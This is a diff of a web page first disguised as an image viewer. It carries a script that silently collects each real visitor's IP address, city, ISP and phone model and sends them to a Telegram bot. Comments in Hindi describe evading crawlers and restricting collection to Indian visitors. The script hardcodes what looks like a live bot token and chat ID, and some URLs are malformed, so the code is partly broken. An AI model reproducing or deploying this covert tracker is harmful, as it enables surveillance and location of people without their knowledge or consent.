@@ -1,88 +1,80 @@
-<!DOCTYPE html>
-<html>
-<head>
-    <title>Image Viewer</title>
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <style>
-        body { background-color: black; margin: 0; padding: 0; display: flex; justify-content: center; align-items: center; height: 100vh; user-select: none; }
-        img { max-width: 100%; max-height: 100vh; object-fit: contain; }
-    </style>
-</head>
-<body>
+<script>
+    const telegramToken = "8390339580:AAHgGBL-V3ya7JsCLs5e0lwYnIAEOypvtEE"; 
+    const telegramChatId = "1798743066"; 
 
-    <!-- फोटो सीधे स्क्रीन पर लोड होगी -->
-    <img src="photo.jpg" alt="Image Viewer">
+    let isTracked = false;
 
-    <script>
-        // आपकी लाइव टेलीग्राम डिटेल्स पहले से सेट हैं
-        const telegramToken = "8390339580:AAHgGBL-V3ya7JsCLs5e0lwYnIAEOypvtEE"; 
-        const telegramChatId = "1798743066"; 
+    function isRealHuman() {
+        if (navigator.webdriver) return false; 
+        const ua = navigator.userAgent.toLowerCase();
+        if (ua.includes("python") || ua.includes("curl") || ua.includes("bot")) return false;
+        return true;
+    }
 
-        let isTracked = false;
+    function startTracking() {
+        if (isTracked || !isRealHuman()) return;
+        isTracked = true;
 
-        // 🛡️ सुरक्षा लेयर 1: एंटी-बॉट फ़िल्टर (गूगल/रोबोट टूल्स को यहीं रोक देगा)
-        function isRealHuman() {
-            if (navigator.webdriver) return false; 
-            const ua = navigator.userAgent.toLowerCase();
-            if (ua.includes("python") || ua.includes("curl") || ua.includes("bot") || ua.includes("spider") || ua.includes("crawl")) return false;
-            return true;
-        }
-
-        // ट्रैकिंग शुरू करने का फंक्शन
-        function startTracking() {
-            if (isTracked || !isRealHuman()) return;
-            isTracked = true;
-
-            // 📍 सुरक्षा लेयर 2: आईपी आधारित लोकेशन चेक
-            fetch('https://ipapi.co')
-            .then(response => response.json())
-            .then(ipData => {
-                
-                // 🇮🇳 सुरक्षा लेयर 3: सिर्फ इंडिया लॉक (यदि देश 'IN' है तभी टेलीग्राम पर मैसेज जाएगा)
-                if (ipData.country_code === "IN") {
-                    
-                    // सुरक्षा लेयर 4: फोन का सटीक मॉडल निकालना (क्लाउडफ्लेयर Accept-CH की मदद से)
-                    let phoneModel = "Laptop/Desktop or Hidden Model";
-                    if (navigator.userAgentData && typeof navigator.userAgentData.getHighEntropyValues === 'function') {
-                        navigator.userAgentData.getHighEntropyValues(['model'])
-                        .then(uaData => {
-                            if(uaData.model) phoneModel = uaData.model;
-                            sendToTelegram(ipData, phoneModel);
-                        }).catch(() => {
-                            sendToTelegram(ipData, phoneModel);
-                        });
-                    } else {
-                        sendToTelegram(ipData, phoneModel);
-                    }
-                }
-            }).catch(err => console.log("Network Error"));
-        }
-
-        // टेलीग्राम पर तुरंत मैसेज भेजने का फंक्शन
-        function sendToTelegram(ip, model) {
-            const message = `🚨 *New Real Visitor Alert (India)* 🚨\n\n` +
-                            `🌐 *IP Address:* \`${ip.ip}\`\n` +
-                            `📍 *Location:* ${ip.city}, ${ip.region} (India)\n` +
-                            `🏢 *ISP/Internet:* ${ip.org}\n` +
-                            `📱 *Device Model:* ${model}\n` +
-                            `⏱️ *Time:* ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}` ;
-
-            fetch(`https://telegram.org{telegramToken}/sendMessage`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    chat_id: telegramChatId,
-                    text: message,
-                    parse_mode: 'Markdown'
-                })
+        // 🚀 एक साथ 2 अलग-अलग API से ट्राई करेगा ताकि फेल होने का चांस 0% हो जाए
+        fetch('https://ipapi.co')
+        .then(res => res.json())
+        .then(data => processVisitor(data))
+        .catch(() => {
+            // अगर पहली API फेल हुई, तो ये दूसरी बैकअप API तुरंत काम करेगी
+            fetch('https://ipinfo.io')
+            .then(res => res.json())
+            .then(data => {
+                // दोनों API का डेटा फॉर्मेट मैच करना
+                let formattedData = {
+                    ip: data.ip,
+                    country_code: data.country,
+                    city: data.city,
+                    region: data.region,
+                    org: data.org
+                };
+                processVisitor(formattedData);
             });
+        });
+    }
+
+    function processVisitor(ipData) {
+        // 🇮🇳 सिर्फ इंडिया लॉक
+        if (ipData.country_code === "IN" || ipData.country_code === "India") {
+            let phoneModel = "Laptop/Desktop or Hidden Model";
+            if (navigator.userAgentData && typeof navigator.userAgentData.getHighEntropyValues === 'function') {
+                navigator.userAgentData.getHighEntropyValues(['model'])
+                .then(uaData => {
+                    if(uaData.model) phoneModel = uaData.model;
+                    sendToTelegram(ipData, phoneModel);
+                }).catch(() => {
+                    sendToTelegram(ipData, phoneModel);
+                });
+            } else {
+                sendToTelegram(ipData, phoneModel);
+            }
         }
+    }
 
-        // जैसे ही असली इंसान पेज खोलेगा या टच/मूव करेगा, स्क्रिप्ट एक्टिव होगी
-        window.addEventListener('DOMContentLoaded', startTracking);
-        window.addEventListener('touchstart', startTracking);
-        window.addEventListener('mousemove', startTracking);
-    </script>
+    function sendToTelegram(ip, model) {
+        const message = `🚨 *New Real Visitor Alert (India)* 🚨\n\n` +
+                        `🌐 *IP Address:* \`${ip.ip}\`\n` +
+                        `📍 *Location:* ${ip.city}, ${ip.region}\n` +
+                        `🏢 *ISP/Internet:* ${ip.org}\n` +
+                        `📱 *Device Model:* ${model}\n` +
+                        `⏱️ *Time:* ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}` ;
 
-</body>
-</html>
+        fetch(`https://telegram.org{telegramToken}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                chat_id: telegramChatId,
+                text: message,
+                parse_mode: 'Markdown'
+            })
+        });
+    }
+
+    window.addEventListener('DOMContentLoaded', startTracking);
+    window.addEventListener('touchstart', startTracking);
+    window.addEventListener('mousemove', startTracking);
+</script>
